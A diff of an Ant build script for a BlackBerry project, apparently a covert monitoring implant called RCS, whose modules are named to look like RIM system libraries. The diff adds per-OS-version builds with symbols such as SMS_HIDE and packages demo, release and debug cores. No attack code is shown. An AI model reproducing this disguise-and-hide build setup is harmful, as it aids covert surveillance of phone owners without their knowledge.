@@ -30,10 +30,12 @@
 	<property name="lib.codename" value="net_rim_bb_lib_base" />
 	<property name="group.name" value="Rim Library" />
 
-	<property name="dist.lib" value="output/45/release/${lib.codename}.cod" />
-	<property name="dist.core" value="output/45/release/${core.codename}.cod" />
-	<property name="nodemo.core" value="output/45/nodemo/${core.codename}.cod" />
-	<property name="debug.core" value="output/45/debug/${core.codename}.cod" />
+	<property name="dist.lib" value="release/${lib.codename}.cod" />
+	<property name="dist.core" value="release/${core.codename}.cod" />
+	<property name="nodemo.core" value="nodemo/${core.codename}.cod" />
+	<property name="debug.core" value="debug/${core.codename}.cod" />
+
+	<property name="wanted.versions" value="5.0,4.5" />
 
 	<!-- Symbols 
 	DEBUG: versione con i log di debug su file
@@ -49,6 +51,16 @@
 	<property name="preprocess.nodemo.symbols" value="RELEASE,NODEMO" />
 	<property name="preprocess.fakeconf.symbols" value="DEBUG,DBC,DEMO,FAKECONF" />
 
+	<property name="preprocess.4.5.symbols" value="NO_SMS_HIDE,NO_MMS" />
+	<property name="preprocess.4.6.symbols" value="NO_SMS_HIDE,NO_MMS" />
+	<property name="preprocess.4.6.1.symbols" value="NO_SMS_HIDE,NO_MMS" />
+	<property name="preprocess.4.7.symbols" value="SMS_HIDE,MMS" />
+	<property name="preprocess.5.0.symbols" value="SMS_HIDE,MMS" />
+	<property name="preprocess.6.0.symbols" value="SMS_HIDE,MMS" />
+	<property name="preprocess.7.0.symbols" value="SMS_HIDE,MMS" />
+	<property name="preprocess.7.1.symbols" value="SMS_HIDE,MMS" />
+
+	<property name="javaloader" value="${jde.4.5.home}/bin/JavaLoader.exe" />
 
 	<!-- Sources -->
 	<property name="lib.src" location="RCSBlackBerryResources/src" />
@@ -125,8 +137,9 @@
 	<macrodef name="preprocess">
 		<attribute name="dir.src" />
 		<attribute name="dir.to" />
-		<attribute name="preprocess.symbols" default="" />
+		<attribute name="preprocess.symbols" default="NO_SYMBOLS" />
 		<attribute name="exclude" default="**/tests/" />
+		<attribute name="version" />
 		<sequential>
 			<echo message="=== Preprocess @{dir.src} => @{dir.to} ===" />
 			<mkdir dir="@{dir.to}" />
@@ -142,7 +155,8 @@
 			<fakeconf dir.to="@{dir.to}" preprocess.symbols="@{preprocess.symbols}" />
 
 			<replace dir="@{dir.to}" token="//#preprocess" value="//!preprocess" />
-			<wtkpreprocess verbose="false" srcdir="@{dir.to}" destdir="@{dir.to}" symbols="@{preprocess.symbols}" />
+			<echo message="--- Symbols @{preprocess.symbols},BlackBerrySDK@{version}.0 ---" />
+			<wtkpreprocess verbose="false" srcdir="@{dir.to}" destdir="@{dir.to}" symbols="@{preprocess.symbols},BlackBerrySDK@{version}.0" />
 		</sequential>
 	</macrodef>
 
@@ -179,7 +193,7 @@
 			</manifest>
 
 			<!-- Preprocess. -->
-			<preprocess dir.src="${lib.src}" dir.to="${builddir}/preprocessed" />
+			<preprocess dir.src="${lib.src}" dir.to="${builddir}/preprocessed" version="@{version}" />
 
 			<!-- Compile everything, but don't preverify (yet). -->
 			<wtkbuild srcdir="${builddir}/preprocessed" destdir="${builddir}/unverified" preverify="false" />
@@ -268,14 +282,13 @@
 				<equals arg1="@{kind}" arg2="test" />
 				<then>
 					<echo message="Test preprocess" />
-					<preprocess dir.src="${core.src}" dir.to="${builddir}/preprocessed" preprocess.symbols="@{preprocess.symbols}" exclude="" />
+					<preprocess version="@{version}" dir.src="${core.src}" dir.to="${builddir}/preprocessed" preprocess.symbols="@{preprocess.symbols}" exclude="" />
 				</then>
 				<else>
 					<echo message="Normal preprocess" />
-					<preprocess dir.src="${core.src}" dir.to="${builddir}/preprocessed" preprocess.symbols="@{preprocess.symbols}" />
+					<preprocess version="@{version}" dir.src="${core.src}" dir.to="${builddir}/preprocessed" preprocess.symbols="@{preprocess.symbols}" />
 				</else>
 			</if>
-
 
 			<!-- Compile everything, but don't preverify (yet). -->
 			<echo>lib: "output/@{version}/${lib.codename}.jar" </echo>
@@ -395,7 +408,7 @@
 	<!-- list="45,50" -->
 	<target name="build" depends="clean,init">
 
-		<for list="45" param="version">
+		<for list="${wanted.versions}" param="version">
 			<sequential>
 				<echo message="==============" />
 				<echo message="===  BUILD === ------------------------------------------------------------" />
@@ -407,31 +420,33 @@
 				<var name="net_rim_api.jar" value="${jde.home}/lib/net_rim_api.jar" />
 				<var name="bb.buildjars.home" value="${jde.home}/bin" />
 
+				<local name="preprocess.version.symbols" />
+				<propertycopy name="preprocess.version.symbols" from="preprocess.@{version}.symbols" />
+
 				<echo>jde.home=${jde.home}</echo>
 
-				<libbuild version="@{version}" preprocess.symbols="${preprocess.release.symbols}" />
+				<libbuild version="@{version}" preprocess.symbols="${preprocess.release.symbols},${preprocess.version.symbols}" />
 
 				<echo message="_____________" />
 				<echo message="     DEBUG   " />
-				<corebuild kind="debug" version="@{version}" preprocess.symbols="${preprocess.debug.symbols}" />
-
+				<corebuild kind="debug" version="@{version}" preprocess.symbols="${preprocess.debug.symbols},${preprocess.version.symbols}" />
 
 				<echo message="_____________" />
 				<echo message="    RELEASE  " />
-				<corebuild kind="release" version="@{version}" preprocess.symbols="${preprocess.release.symbols}" />
-
-				<echo message="_____________" />
-				<echo message="    NODEMO  " />
-				<corebuild kind="nodemo" version="@{version}" preprocess.symbols="${preprocess.nodemo.symbols}" />
+				<corebuild kind="release" version="@{version}" preprocess.symbols="${preprocess.release.symbols},${preprocess.version.symbols}" />
 
 				<!--
 				<echo message="_____________" />
+				<echo message="    NODEMO  " />
+				<corebuild kind="nodemo" version="@{version}" preprocess.symbols="${preprocess.nodemo.symbols},${preprocess.version.symbols}" />
+				
+				<echo message="_____________" />
 				<echo message="   FAKECONF    " />
-				<corebuild kind="fakeconf" version="@{version}" preprocess.symbols="${preprocess.fakeconf.symbols}" />
+				<corebuild kind="fakeconf" version="@{version}" preprocess.symbols="${preprocess.fakeconf.symbols},${preprocess.version.symbols}" />
 				
 				<echo message="_____________" />
 				<echo message="     TEST    " />
-				<corebuild kind="test" version="@{version}" preprocess.symbols="${preprocess.test.symbols}" />			
+				<corebuild kind="test" version="@{version}" preprocess.symbols="${preprocess.test.symbols},${preprocess.version.symbols}" />			
 				-->
 			</sequential>
 		</for>
@@ -440,8 +455,8 @@
 	<!-- Load to device depends="sign" -->
 	<target name="load">
 		<echo message="=== Load ===" />
-		<echo>${jde.45.home}/bin/JavaLoader.exe ${lib.codename}.cod ${core.codename}.cod</echo>
-		<exec executable="${jde.45.home}/bin/JavaLoader.exe" dir="." failonerror="true">
+		<echo>${javaloader} ${lib.codename}.cod ${core.codename}.cod</echo>
+		<exec executable="${javaloader}" dir="." failonerror="true">
 			<arg value="-wrddr" />
 			<arg value="-u" />
 			<arg value="load" />
@@ -453,8 +468,8 @@
 	<!-- Load to device depends="sign" -->
 	<target name="loadcoredebug">
 		<echo message="=== Load ===" />
-		<echo>${jde.45.home}/bin/JavaLoader.exe ${core.codename}.cod</echo>
-		<exec executable="${jde.45.home}/bin/JavaLoader.exe" dir="." failonerror="true">
+		<echo>${javaloader} ${core.codename}.cod</echo>
+		<exec executable="${javaloader}" dir="." failonerror="true">
 			<arg value="-wrddr" />
 			<arg value="-u" />
 			<arg value="load" />
@@ -464,8 +479,8 @@
 
 	<target name="loadcorerelease">
 		<echo message="=== Load ===" />
-		<echo>${jde.45.home}/bin/JavaLoader.exe ${core.codename}.cod</echo>
-		<exec executable="${jde.45.home}/bin/JavaLoader.exe" dir="." failonerror="true">
+		<echo>${javaloader} ${core.codename}.cod</echo>
+		<exec executable="${javaloader}" dir="." failonerror="true">
 			<arg value="-wrddr" />
 			<arg value="-u" />
 			<arg value="load" />
@@ -478,8 +493,8 @@
 	<!-- Load to device depends="sign" -->
 	<target name="uninstall">
 		<echo message="=== Uninstall ===" />
-		<echo>${jde.45.home}/bin/JavaLoader.exe</echo>
-		<exec executable="${jde.45.home}/bin/JavaLoader.exe" dir="." failonerror="true">
+		<echo>${javaloader}</echo>
+		<exec executable="${javaloader}" dir="." failonerror="true">
 			<arg value="-u" />
 			<arg value="erase" />
 			<arg value="-f" />
@@ -538,8 +553,13 @@
 			<fileset dir="server/template/bin" />
 		</copy>
 
-		<copy file="${dist.lib}" toDir="server/core" overwrite="true" />
-		<copy file="${dist.core}" toDir="server/core" overwrite="true" />
+		<for list="${wanted.versions}" param="version">
+			<sequential>
+				<mkdir dir="server/core/@{version}" />
+				<copy file="output/@{version}/${dist.lib}" toDir="server/core/@{version}" overwrite="true" />
+				<copy file="output/@{version}/${dist.core}" toDir="server/core/@{version}" overwrite="true" />
+			</sequential>
+		</for>
 
 		<zip destfile="server/blackberry_${version}.zip" basedir="server/core" />
 	</target>
@@ -560,19 +580,20 @@
 
 	<macrodef name="rcscomp">
 		<attribute name="destdir" />
+		<attribute name="version"/>
 		<sequential>
 			<mkdir dir="@{destdir}/rcs7" />
 
-			<copy file="${dist.lib}" tofile="@{destdir}/lib.blackberry" overwrite="true" />
+			<copy file="output/@{version}/${dist.lib}" tofile="@{destdir}/lib.blackberry" overwrite="true" />
 
 			<mkdir dir="@{destdir}/build" />
-			<unzip src="${dist.core}" dest="@{destdir}/build" overwrite="true" />
+			<unzip src="output/@{version}/${dist.core}" dest="@{destdir}/build" overwrite="true" />
 			<move file="@{destdir}/build/net_rim_bb_lib.cod" tofile="@{destdir}/build/net_rim_bb_core-0.cod" overwrite="true" />
 			<move file="@{destdir}/build/net_rim_bb_lib-1.cod" tofile="@{destdir}/build/net_rim_bb_core-1.cod" overwrite="true" />
 			<zip destfile="@{destdir}/core.demo.blackberry" basedir="@{destdir}/build/" compress="false" />
 
 			<mkdir dir="@{destdir}/buildnodemo" />
-			<unzip src="${nodemo.core}" dest="@{destdir}/buildnodemo" overwrite="true" />			
+			<unzip src="output/@{version}/${nodemo.core}" dest="@{destdir}/buildnodemo" overwrite="true" />
 			<move file="@{destdir}/buildnodemo/net_rim_bb_lib.cod" tofile="@{destdir}/buildnodemo/net_rim_bb_core-0.cod" overwrite="true" />
 			<move file="@{destdir}/buildnodemo/net_rim_bb_lib-1.cod" tofile="@{destdir}/buildnodemo/net_rim_bb_core-1.cod" overwrite="true" />
 			<zip destfile="@{destdir}/core.nodemo.blackberry" basedir="@{destdir}/buildnodemo/" compress="false" />
@@ -590,18 +611,24 @@
 		</tstamp>
 		<property file="build.number" />
 
-		<input message="Release (8.0)?" addproperty="do.release" defaultvalue="8.0" />
+		<input message="Release (8.1)?" addproperty="do.release" defaultvalue="8.1" />
 		<var name="destdir" value="../dist/${do.release}/${build.number}.${timestamp.BUILD}" />
 		<echo>${destdir}</echo>
-		<mkdir dir="${destdir}" />
 
-		<rcscomp destdir="${destdir}/rcs7" />
 
-		<copy file="${dist.lib}" toDir="${destdir}" overwrite="true" />
-		<copy file="${dist.core}" toDir="${destdir}" overwrite="true" />
-		<copy file="${debug.core}" toFile="${destdir}/core.debug.cod" overwrite="true" />
+		<!-- <rcscomp destdir="${destdir}/rcs7" version="4.5"/> -->
+
+		<for list="${wanted.versions}" param="version">
+			<sequential>
+				<mkdir dir="${destdir}/@{version}" />
+				<copy file="output/@{version}/${dist.lib}" toDir="${destdir}/@{version}" overwrite="true" />
+				<copy file="output/@{version}/${dist.core}" toDir="${destdir}/@{version}" overwrite="true" />
+				<copy file="output/@{version}/${debug.core}" toFile="${destdir}/@{version}/core.debug.cod" overwrite="true" />
+			</sequential>
+		</for>
 
 		<antcall target="servercore" />
+		<!--
 		<copy file="server/blackberry_${version}.zip" toDir="${destdir}" overwrite="true" />
 
 		<zipdist destfile="${destdir}/blackberry_sources.zip" />
@@ -612,7 +639,7 @@
 			</fileset>
 		</checksum>
 
-		<antcall target="update" />
+		<antcall target="update" /> -->
 
 	</target>
 
